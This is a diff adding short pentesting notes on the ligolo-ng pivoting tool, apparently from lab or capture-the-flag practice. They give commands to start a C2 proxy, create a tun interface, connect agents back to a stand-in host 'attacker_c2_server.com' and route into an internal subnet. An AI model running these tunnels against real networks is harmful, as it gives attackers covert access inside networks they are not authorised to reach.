@@ -1,0 +1,22 @@
+#ligolo-ng 
+
+- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface
+- Psuedo VPN for tunneling
+- preinstalled in kali
+- download precompiled binaries
+- create tun adapter on C2 server or see below
+- **Start** C2 server
+	- `./proxy -h`  Help options
+	- `sudo ./proxy -autocert`  Automatically **request** LetsEncrypt certificates
+	- `sudo ./proxy -selfcert`  **Use** self-signed certificates
+	- `interface_create --name "evil-cha"` **create** a tun called `evil-cha`
+	- `certificate_fingerprint` **get** the cert fingerprint which will be used for clients
+- **Connect** Agents
+	- `ligolo-agent -connect 127.0.0.1:11601 -v -accept-fingerprint 32A0807A02242C3BDE2682B6382E7CD68CC46CA72C5481C2411A2FD855BB2AD8 errbit@HTB-Kali-VM` **connect** to the ligolo proxy server, get finger print from C2
+	- `./agent -connect attacker_c2_server.com:11601` **connect** back to C2 server **use** `-ignore-cert` when using `-selfcert`
+- Using sessions
+	- `session` **list** sessions
+	- **Select** which session you want to use
+	- `tunnel_start --tun evil-cha` **start** the proxy tunnel on created `tun`
+	- `ifconfig` list network info
+	- `interface_add_route --name evil-cha --route 192.168.2.0/24` **Add** routing information to the route table note `--route {IP}` is the internal network
